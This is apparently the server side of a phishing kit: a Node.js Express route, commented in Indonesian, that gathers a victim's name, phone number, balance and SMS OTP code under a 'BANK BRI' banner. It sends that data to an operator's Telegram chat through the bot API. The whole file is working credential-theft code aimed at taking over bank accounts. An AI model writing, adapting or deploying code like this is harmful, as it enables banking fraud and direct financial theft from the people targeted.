const express = require("express");
const axios = require("axios");
const router = express.Router();

// Jika ingin menggunakan session, pastikan express-session sudah di-setup di server.js
// Misalnya: req.session.nama = nama;

router.post("/", async (req, res) => {
    try {
        // Mengambil data dari body request
        const { nama, nomor, saldo, sms } = req.body;
        if (!nama || !nomor || !saldo || !sms) {
            return res.status(400).json({ error: "Semua field harus diisi!" });
        }
        
        // Jika menggunakan session, simpan data tersebut
        if (req.session) {
            req.session.nama = nama;
            req.session.nomor = nomor;
            req.session.saldo = saldo;
        }
        
        // Membuat pesan dengan format yang sama seperti di PHP
        const message = `
────────────────────
BANK BRI | OTP | \`${nomor}\`
────────────────────
 • Nama Lengkap : \`${nama}\`
 • Nomor Handphone : \`${nomor}\`
 • Jumlah Saldo Sekarang : \`${saldo}\`
 • Kode OTP : \`${sms}\`
────────────────────`;

        // Mengambil konfigurasi telegram dari file telegram.json
        const telegramConfig = require("./telegram.json");
        const telegramId = telegramConfig.telegramId;
        const botToken = telegramConfig.botToken;
        
        // Membuat URL API Telegram, dengan parse_mode markdown
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?parse_mode=markdown&chat_id=${telegramId}&text=${encodeURIComponent(message)}`;
        
        // Mengirim pesan ke Telegram menggunakan axios (GET sudah cukup karena URL sudah lengkap)
        await axios.get(telegramUrl);

        res.json({ success: true, message: "Pesan berhasil dikirim ke Telegram!" });
    } catch (error) {
        console.error("Error:", error);
        res.status(500).json({ error: "Gagal mengirim pesan ke Telegram!" });
    }
});

module.exports = router;
